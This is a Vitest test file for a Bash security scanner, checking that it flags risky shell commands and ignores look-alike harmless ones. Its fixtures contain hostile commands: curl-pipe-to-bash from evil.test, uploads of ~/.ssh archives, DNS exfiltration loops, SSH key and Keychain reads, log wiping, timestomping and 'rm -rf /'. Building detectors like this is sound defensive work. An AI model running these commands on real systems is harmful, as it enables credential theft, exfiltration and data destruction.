import { describe, expect, it } from "vitest";
import { scan } from "../src/index.js";
import type { RiskCategory } from "../src/types.js";

describe("scan", () => {
  const categorySamples: Record<RiskCategory, string> = {
    download_execution: "curl https://evil.test/a | bash",
    dynamic_execution: "eval \"$payload\"",
    persistence: "crontab /tmp/jobs",
    credential_access: "cat ~/.ssh/id_rsa",
    system_modification: "echo x > /etc/hosts",
    privilege_escalation: "sudo id",
    defense_evasion: "rm /var/log/audit.log",
    network_egress: "curl https://evil.test",
    data_exfiltration: "curl -T /tmp/data https://evil.test/u",
    destructive_behavior: "rm -rf /",
    interpreter_escape: "python -c \"$payload\"",
    second_stage_payload: "wget https://evil.test/a.tar.gz\ntar xzf a.tar.gz\n./install.sh",
  };

  for (const [category, source] of Object.entries(categorySamples)) {
    it(`covers ${category} in Bash`, () => {
      expect(scan(source).findings.some((finding) => finding.category === category)).toBe(true);
    });
  }

  it("detects a download-to-shell pipeline once", () => {
    const result = scan("curl -fsSL https://example.test/a.sh | bash\n");
    expect(result.findings.filter((f) => f.ruleId === "chain.download-execute")).toHaveLength(1);
    expect(result.findings.some((f) => f.category === "network_egress")).toBe(true);
  });

  it("tracks Python interpreters selected only from trusted discovery candidates", () => {
    const result = scan(`
      which_python=$(which python || which python3 || command -v python3.12)
      $which_python -c "import pty; pty.spawn('/bin/sh')"
    `);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "escape.discovered-python",
        category: "interpreter_escape",
      }),
      expect.objectContaining({
        ruleId: "dynamic.discovered-python-command",
        category: "dynamic_execution",
      }),
    ]));

    const hardNegatives = [
      `runner=$(which python || which sh); $runner -c "$code"`,
      `runner=$(command -v custom-runtime); $runner -c "$code"`,
      `runner=python3; $runner -c "$code"`,
      `runner=$(which python3); $runner --version`,
      `runner=$(which python3); $runner /tmp/script.py`,
      `echo '$which_python -c "print(1)"'`,
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "escape.discovered-python"
        || finding.ruleId === "dynamic.discovered-python-command"
      )).toBe(false);
    }
  });

  it("classifies static interpreter inline-code switches as dynamic execution", () => {
    const commands = [
      "python3 -c 'print(1)'",
      "perl -e 'print 1'",
      "ruby -e 'puts 1'",
      "node --eval 'console.log(1)'",
      "php -r 'echo 1;'",
      "osascript -e 'return 1'",
      "pwsh -Command 'Get-Date'",
    ];
    for (const source of commands) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "dynamic.interpreter-inline-code"
      )).toBe(true);
    }
    expect(scan("python3 /tmp/script.py").findings.some((finding) =>
      finding.ruleId === "dynamic.interpreter-inline-code"
    )).toBe(false);
  });

  it("detects staged archive execution", () => {
    const result = scan(`
      wget https://example.test/tool.tar.gz -O /tmp/tool.tar.gz
      tar xzf /tmp/tool.tar.gz -C /tmp
      /tmp/tool/install.sh
    `);
    expect(result.findings.some((f) => f.category === "second_stage_payload")).toBe(true);
  });

  it("tracks a variable-derived archive through extraction and execution", () => {
    const result = scan(`
      archive_uri=https://example.test/tool.zip
      exe=$HOME/.local/bin/tool
      curl --fail --output "$exe.zip" "$archive_uri"
      unzip -oqd "$HOME/.local/bin" "$exe.zip"
      mv "$HOME/.local/bin/tool-release/tool" "$exe"
      chmod +x "$exe"
      TOOL_UPDATE=true $exe completions
    `);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "chain.archive-output-execute",
        category: "download_execution",
      }),
      expect.objectContaining({
        ruleId: "chain.second-stage-variable-archive",
        category: "second_stage_payload",
      }),
    ]));

    const storedOnly = scan(`
      curl --output "$artifact.zip" "$url"
      unzip "$artifact.zip" -d "$cache"
      chmod +x "$other_file"
    `);
    expect(storedOnly.findings.some((finding) =>
      finding.ruleId === "chain.archive-output-execute"
      || finding.ruleId === "chain.second-stage-variable-archive"
    )).toBe(false);
  });

  it("classifies eval or run only after proving a downloaded runtime", () => {
    const result = scan(`
      runtime=$HOME/.local/bin/deno
      curl --output "$runtime.zip" "$runtime_url"
      unzip "$runtime.zip" -d "$HOME/.local/bin"
      chmod +x "$runtime"
      $runtime eval "$code"
    `);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "chain.downloaded-interpreter",
        category: "interpreter_escape",
      }),
      expect.objectContaining({
        ruleId: "chain.downloaded-dynamic-code",
        category: "dynamic_execution",
      }),
    ]));

    const unproven = scan(`
      helper=$HOME/bin/project-helper
      $helper run task
      echo '$helper eval code'
    `);
    expect(unproven.findings.some((finding) =>
      finding.ruleId === "chain.downloaded-interpreter"
      || finding.ruleId === "chain.downloaded-dynamic-code"
    )).toBe(false);
  });

  it("detects login-shell changes, zsh execution, and rc replacement with command boundaries", () => {
    const result = scan(`
      mv -f "$zdot/.zshrc-omztemp" "$zdot/.zshrc"
      sudo chsh -s "$zsh" "$USER"
      exec zsh -l
    `);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "persistence.shell-rc-replace",
        category: "persistence",
      }),
      expect.objectContaining({
        ruleId: "system.login-shell",
        category: "system_modification",
      }),
      expect.objectContaining({
        ruleId: "escape.interpreter",
        category: "interpreter_escape",
      }),
    ]));

    const hardNegative = scan(`
      command_exists() { command -v "$@" >/dev/null 2>&1; }
      command_exists zsh
      mv "$zdot/.zshrc" "$backup_file"
      chsh --help
      echo "exec zsh -l"
    `);
    expect(hardNegative.findings.some((finding) =>
      finding.ruleId === "persistence.shell-rc-replace"
      || finding.ruleId === "system.login-shell"
      || finding.ruleId === "escape.interpreter"
    )).toBe(false);
  });

  it("tracks startup-file variables used by compound redirects", () => {
    const result = scan(`
      zsh_config=$HOME/.zshrc
      commands=("export TOOL_HOME=$HOME/.tool" "export PATH=$TOOL_HOME/bin:$PATH")
      {
        for command in "\${commands[@]}"; do echo "$command"; done
      } >>"$zsh_config"

      logs=(/tmp/worker.log /tmp/audit-copy.log)
      for log in "\${logs[@]}"; do echo ok >>"$log"; done
    `);
    expect(result.findings.filter((finding) =>
      finding.ruleId === "persistence.shell-rc-variable"
    )).toHaveLength(1);
  });

  it("detects persistence and credential access", () => {
    const result = scan(`
      echo '* * * * * /tmp/a' | crontab -
      cat ~/.ssh/id_rsa
      echo evil >> ~/.bashrc
    `);
    expect(result.summary.byCategory.persistence).toBe(2);
    expect(result.summary.byCategory.credential_access).toBe(1);
  });

  it("distinguishes crontab replacement from read, edit, and removal operations", () => {
    const replacements = [
      "crontab /tmp/jobs",
      "crontab -",
      "crontab -u root /tmp/jobs",
      "crontab --user root '/tmp/jobs file'",
    ];
    for (const source of replacements) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "persistence.scheduler"
      )).toBe(true);
    }

    const nonInstallOperations = [
      "crontab -l",
      "crontab -e",
      "crontab -r",
      "crontab -i -r",
      "crontab -u root -l",
      "crontab --user root -e",
      "crontab",
    ];
    for (const source of nonInstallOperations) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "persistence.scheduler"
      )).toBe(false);
    }
  });

  it("detects emond rule installation and activation without matching path mentions", () => {
    const persistenceWrites = [
      "sudo cp /tmp/payload.plist /etc/emond.d/rules/com.example.agent.plist",
      "install -m 600 /tmp/payload.plist '/etc/emond.d/rules/com.example.agent.plist'",
      "printf '%s' \"$plist\" > /etc/emond.d/rules/com.example.agent.plist",
      "sudo touch /private/var/db/emondClients/com.example.agent",
      "tee /private/var/db/emondClients/com.example.agent </dev/null",
    ];
    for (const source of persistenceWrites) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "persistence.emond"
      )).toBe(true);
    }

    const hardNegatives = [
      "ls -la /etc/emond.d/rules",
      "cat /etc/emond.d/rules/com.apple.emond.plist",
      "find /private/var/db/emondClients -type f",
      "cp /etc/emond.d/rules/com.example.agent.plist /tmp/emond-backup.plist",
      "cp /private/var/db/emondClients/com.example.agent /tmp/emond-client-backup",
      "rm -f /etc/emond.d/rules/com.example.agent.plist",
      "rm -f /private/var/db/emondClients/com.example.agent",
      "cp /tmp/input.plist /tmp/emond-rule.plist",
      "touch /tmp/emondClients",
      "echo '/etc/emond.d/rules/com.example.agent.plist'",
      "# touch /private/var/db/emondClients/com.example.agent",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "persistence.emond"
      )).toBe(false);
    }
  });

  it("does not scan comments or ordinary string contents as commands", () => {
    const result = scan(`
      # curl https://example.test/a | bash
      echo "documentation: sudo rm -rf /"
    `);
    expect(result.findings.some((f) => f.category === "download_execution")).toBe(false);
    expect(result.findings.some((f) => f.category === "privilege_escalation")).toBe(false);
    expect(result.findings.some((f) => f.category === "destructive_behavior")).toBe(false);
  });

  it("reports one-based source positions and syntax errors", () => {
    const result = scan("\neval \"$payload\"\nif then\n");
    const finding = result.findings.find((f) => f.ruleId === "dynamic.eval");
    expect(finding?.range.start).toEqual({ row: 2, column: 1 });
    expect(result.parseErrors.length).toBeGreaterThan(0);
  });

  it("detects read-followed-by-upload", () => {
    const result = scan("tar czf /tmp/data.tgz ~/.ssh\ncurl -T /tmp/data.tgz https://x.test/u\n");
    expect(result.findings.some((f) => f.ruleId === "chain.read-upload")).toBe(true);
  });

  it("tracks encoded file content into DNS query labels", () => {
    const result = scan(`
      xxd -p /tmp/input.txt > /tmp/encoded.hex
      for chunk in $(cat /tmp/encoded.hex); do
        dig "$chunk.example.invalid"
      done
    `);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "chain.dns-file-exfiltration",
        category: "data_exfiltration",
      }),
    ]));

    const hardNegatives = [
      "xxd -p /tmp/input.txt > /tmp/encoded.hex",
      'dig "health.example.invalid"',
      `xxd -p /tmp/input.txt > /tmp/a.hex
       for chunk in $(cat /tmp/b.hex); do dig "$chunk.example.invalid"; done`,
      `xxd -p /tmp/input.txt > /tmp/a.hex
       for chunk in $(cat /tmp/a.hex); do echo "$chunk.example.invalid"; done`,
      `xxd -p /tmp/input.txt > /tmp/a.hex
       for chunk in $(cat /tmp/a.hex); do dig "$chunk"; done`,
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "chain.dns-file-exfiltration"
      )).toBe(false);
    }
  });

  it("tracks discovered netrc files into looped credential reads", () => {
    const result = scan(`
      for file in $(find /tmp/home -type f -name .netrc 2>/dev/null); do
        echo "$file"
        cat "$file"
      done
    `);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "chain.find-read-netrc",
        category: "credential_access",
      }),
    ]));
    expect(scan("cat /tmp/home/.netrc").findings).toEqual(expect.arrayContaining([
      expect.objectContaining({ ruleId: "credential.netrc-read" }),
    ]));

    const hardNegatives = [
      "find /tmp/home -type f -name .netrc",
      `for file in $(find /tmp/home -name .netrc); do echo "$file"; done`,
      `for file in $(find /tmp/home -name .bashrc); do cat "$file"; done`,
      `for file in $(find /tmp/home -name .netrc); do cat "$other"; done`,
      `for file in $(find /tmp/home -name .netrc); do cat /tmp/public.txt; done`,
      "echo 'cat ~/.netrc'",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "chain.find-read-netrc"
        || finding.ruleId === "credential.netrc-read"
      )).toBe(false);
    }
  });

  it("detects macOS Keychain credential extraction without flagging certificate operations", () => {
    const credentialCommands = [
      "security dump-keychain -d login.keychain",
      "sudo security dump-keychain login.keychain-db",
      "security find-generic-password -s example -w",
      "security find-internet-password -a user -w",
    ];
    for (const source of credentialCommands) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "credential.macos-keychain"
      )).toBe(true);
    }

    const hardNegatives = [
      "security find-certificate -a -p",
      "security import /tmp/cert.pem -k login.keychain",
      "security list-keychains",
      "security find-generic-password -s example",
      "security find-internet-password -a user",
      "security help dump-keychain",
      "echo 'security dump-keychain login.keychain'",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "credential.macos-keychain"
      )).toBe(false);
    }
  });

  it("allows download-execute from an explicitly trusted exact host", () => {
    const result = scan("curl https://artifacts.corp.example/a.sh | sh", {
      allowedDownloadHosts: ["artifacts.corp.example"],
    });
    expect(result.findings.some((f) => f.category === "download_execution")).toBe(false);
    expect(result.findings.some((f) => f.category === "network_egress")).toBe(true);
  });

  it("supports safe subdomain wildcards without matching lookalikes", () => {
    const options = { allowedDownloadHosts: ["*.corp.example"] };
    expect(scan("curl https://build.corp.example/a | sh", options).findings
      .some((f) => f.category === "download_execution")).toBe(false);
    expect(scan("curl https://corp.example/a | sh", options).findings
      .some((f) => f.category === "download_execution")).toBe(true);
    expect(scan("curl https://corp.example.evil.test/a | sh", options).findings
      .some((f) => f.category === "download_execution")).toBe(true);
  });

  it("optionally allows literal private IPv4 but fails closed for variable URLs", () => {
    expect(scan("wget http://10.2.3.4/a -O- | bash", {
      allowPrivateDownloadIps: true,
    }).findings.some((f) => f.category === "download_execution")).toBe(false);
    expect(scan("curl \"$INTERNAL_URL\" | bash", {
      allowedDownloadHosts: ["*.corp.example"],
      allowPrivateDownloadIps: true,
    }).findings.some((f) => f.category === "download_execution")).toBe(true);
  });

  it("unwraps common command and privilege wrappers", () => {
    const result = scan(`
      command curl --fail https://example.test/metadata
      execute_sudo tee /etc/paths.d/tool
    `);
    expect(result.findings.some((finding) => finding.category === "network_egress")).toBe(true);
    expect(result.findings.some((finding) => finding.category === "privilege_escalation")).toBe(true);
    expect(result.findings.some((finding) => finding.category === "system_modification")).toBe(true);
  });

  it("propagates statically elevated command variables without trusting arbitrary wrappers", () => {
    const result = scan(`
      SUDO=""
      SUDO="sudo"
      $SUDO systemctl enable --now tailscaled
    `);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "privilege.sudo",
        category: "privilege_escalation",
      }),
      expect.objectContaining({
        ruleId: "persistence.scheduler",
        category: "persistence",
      }),
    ]));

    const harmless = scan(`
      RUNNER="echo"
      $RUNNER systemctl enable example
    `);
    expect(harmless.findings.some((finding) =>
      finding.category === "privilege_escalation" || finding.category === "persistence",
    )).toBe(false);
  });

  it("unwraps static compound shell runners while rejecting non-shell command variables", () => {
    const result = scan(`
      sh_c='sh -c'
      sh_c='sudo -E sh -c'
      $sh_c "curl -fsSL https://packages.example/key -o /tmp/tool.asc"
      $sh_c "echo key > /etc/keys/tool.asc"
      $sh_c "systemctl enable --now tool.service"
    `);
    for (const category of [
      "dynamic_execution",
      "network_egress",
      "system_modification",
      "privilege_escalation",
      "persistence",
    ] as const) {
      expect(result.findings.some((finding) => finding.category === category)).toBe(true);
    }

    const harmless = scan(`
      sh_c='echo'
      $sh_c "curl https://example.test | sh"
      $sh_c "systemctl enable example"
    `);
    expect(harmless.findings).toHaveLength(0);
  });

  it("tracks a transparent download wrapper into chmod and variable execution", () => {
    const result = scan(`
      downloader() {
        curl "$1" --output "$2"
      }
      ensure() {
        if ! "$@"; then
          exit 1
        fi
      }
      ignore() {
        "$@"
      }
      main() {
        local file="$tmp/tool"
        ensure downloader "$url" "$file"
        ensure chmod u+x "$file"
        ignore "$file" --install
      }
    `);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "chain.wrapper-download-execute",
        category: "download_execution",
      }),
    ]));

    const unrelated = scan(`
      downloader() {
        curl "$1" --output "$2"
      }
      downloader "$url" "$file"
      chmod u+x "$other"
      "$file"
    `);
    expect(unrelated.findings.some((finding) =>
      finding.ruleId === "chain.wrapper-download-execute",
    )).toBe(false);
  });

  it("distinguishes command discovery from wrapped Git network execution", () => {
    const discovery = scan("command -v curl >/dev/null");
    expect(discovery.findings.some((finding) => finding.category === "network_egress")).toBe(false);

    const fetch = scan(`retry 5 "\${USABLE_GIT}" "fetch" "--force" "origin"`);
    expect(fetch.findings.some((finding) => finding.category === "network_egress")).toBe(true);
  });

  it("distinguishes curl --fail from the case-sensitive -F upload option", () => {
    const download = scan("curl --fail --location https://example.test/file -o /tmp/file");
    expect(download.findings.some((finding) => finding.category === "data_exfiltration")).toBe(false);

    const upload = scan("curl -F file=@/tmp/file https://example.test/upload");
    expect(upload.findings.some((finding) => finding.category === "data_exfiltration")).toBe(true);
  });

  it("does not infer system writes from diagnostic text or set options", () => {
    const result = scan(`
      abort "Tool cannot be installed because /etc/tool/disabled exists"
      set -euo pipefail
    `);
    expect(result.findings.some((finding) => finding.category === "system_modification")).toBe(false);
    expect(result.findings.some((finding) => finding.category === "credential_access")).toBe(false);
  });

  it("detects public red-team private-key and log-overwrite patterns", () => {
    const credentials = scan("find / -name id_rsa 2>/dev/null");
    expect(credentials.findings.some((finding) => finding.category === "credential_access")).toBe(true);

    const overwrite = scan("dd of=/var/log/syslog if=/dev/zero count=1024");
    expect(overwrite.findings.some((finding) => finding.category === "defense_evasion")).toBe(true);
    expect(overwrite.findings.some((finding) => finding.category === "destructive_behavior")).toBe(true);
  });

  it("detects explicit timestomping without flagging ordinary touch updates", () => {
    const explicit = scan("touch -a -t 197001010000.00 /tmp/payload");
    expect(explicit.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "defense.timestomp",
        category: "defense_evasion",
      }),
    ]));

    const reference = scan("touch -acmr /bin/sh /tmp/payload");
    expect(reference.findings.some((finding) =>
      finding.ruleId === "defense.timestomp"
    )).toBe(true);

    const hardNegatives = [
      "touch /tmp/new-file",
      "touch -a /tmp/accessed-now",
      "touch -m /tmp/modified-now",
      "touch -c /tmp/existing-only",
      "touch -a -d now /tmp/accessed-now",
      "echo 'touch -t 197001010000.00 /tmp/example'",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "defense.timestomp"
      )).toBe(false);
    }
  });

  it("detects SUID and SGID additions in combined symbolic chmod modes", () => {
    const privilegedModes = [
      "chmod u+xs /tmp/tool",
      "chmod g+xs /tmp/tool",
      "chmod u+x,g+s /tmp/tool",
      "chmod -- a+rsx /tmp/tool",
      "chmod 4755 /tmp/tool",
      "chmod 2750 /tmp/tool",
    ];
    for (const source of privilegedModes) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "privilege.suid-capability"
      )).toBe(true);
    }

    const hardNegatives = [
      "chmod u+x /tmp/tool",
      "chmod g+x /tmp/tool",
      "chmod u-s /tmp/tool",
      "chmod u+x,g-s /tmp/tool",
      "chmod 0755 /tmp/tool",
      "find /usr/bin -perm -4000",
      "chown root /tmp/tool",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "privilege.suid-capability"
      )).toBe(false);
    }
  });

  it("detects firewall shutdown without flagging firewall administration", () => {
    const disabled = scan("ufw disable");
    expect(disabled.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "system.firewall-disable",
        category: "system_modification",
      }),
      expect.objectContaining({
        ruleId: "defense.security-control",
        category: "defense_evasion",
      }),
    ]));

    const stopped = scan("systemctl stop firewalld.service");
    expect(stopped.findings.some((finding) =>
      finding.ruleId === "system.firewall-disable"
    )).toBe(true);
    expect(scan("ufw logging off").findings.some((finding) =>
      finding.ruleId === "defense.security-control"
    )).toBe(true);

    const hardNegatives = [
      "ufw status verbose",
      "ufw enable",
      "ufw prepend deny from 192.0.2.10",
      "ufw --help",
      "systemctl status ufw",
      "systemctl start firewalld",
      "service pf status",
      "pfctl -s rules",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "system.firewall-disable"
        || finding.ruleId === "defense.security-control"
      )).toBe(false);
    }
  });

  it("distinguishes cloud storage deletion from non-destructive remote operations", () => {
    const deletion = scan("gcloud storage buckets delete gs://example-bucket");
    expect(deletion.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "network.cloud-storage-cli",
        category: "network_egress",
      }),
      expect.objectContaining({
        ruleId: "destructive.cloud-storage-delete",
        category: "destructive_behavior",
      }),
    ]));

    const remoteButNonDestructive = [
      "gcloud storage buckets list",
      "gcloud storage buckets describe gs://example-bucket",
      "gcloud storage buckets create gs://example-bucket",
      "gcloud storage cp ./artifact gs://example-bucket/artifact",
    ];
    for (const source of remoteButNonDestructive) {
      const result = scan(source);
      expect(result.findings.some((finding) =>
        finding.ruleId === "network.cloud-storage-cli"
      )).toBe(true);
      expect(result.findings.some((finding) =>
        finding.ruleId === "destructive.cloud-storage-delete"
      )).toBe(false);
    }

    const localOnly = [
      "gcloud storage --help",
      "echo 'gcloud storage buckets delete gs://example-bucket'",
    ];
    for (const source of localOnly) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "network.cloud-storage-cli"
        || finding.ruleId === "destructive.cloud-storage-delete"
      )).toBe(false);
    }
  });

  it("detects writes through profile path variables", () => {
    const result = scan(`command printf '%s' "$SOURCE" >> "$NVM_PROFILE"`);
    expect(result.findings.some((finding) => finding.category === "persistence")).toBe(true);
  });
});
